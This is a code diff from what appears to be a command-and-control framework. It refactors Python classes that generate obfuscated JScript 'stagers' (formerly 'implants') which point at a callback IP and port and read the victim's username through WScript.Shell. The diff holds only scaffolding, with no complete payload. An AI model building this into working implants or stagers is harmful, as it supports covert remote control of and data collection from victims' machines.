@@ -2,14 +2,13 @@ import time
 
 from connect import util
 
-class Implant():
-
-    variables = {}
-    functions = {}
+class Stager():
 
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
+        self.variables = {}
+        self.functions = {}
         self.setup_variables()
         self.setup_functions()
 
@@ -19,25 +18,15 @@ class Implant():
     def setup_functions(self):
         pass
 
-
-class MshtaImplant(Implant):
-
-    format = 'mshta'
-
-    def __init__(self, ip, port):
-        super().__init__(ip, port)
-
-
-class JScriptImplant(Implant):
+class JScriptStager(Stager):
 
     format = 'jscript'
-    post_req_func =''
 
     def __init__(self, ip, port):
         super().__init__(ip, port)
 
     def setup_functions(self):
-        self.functions['post_req'] = (util.generate_str(), self.post_req_func)
+        self.functions['post_req'] = (util.generate_str())
 
     def setup_variables(self):
         self.variables['host'] = (util.generate_str(), self.ip)
@@ -51,6 +40,3 @@ class JScriptImplant(Implant):
 
         wscript = self.variables['wscript.shell'][0]
         self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')
-
-        #winhttp = self.variables['winhttp.winhttprequest.5.1'][0]
-        #self.variables['']
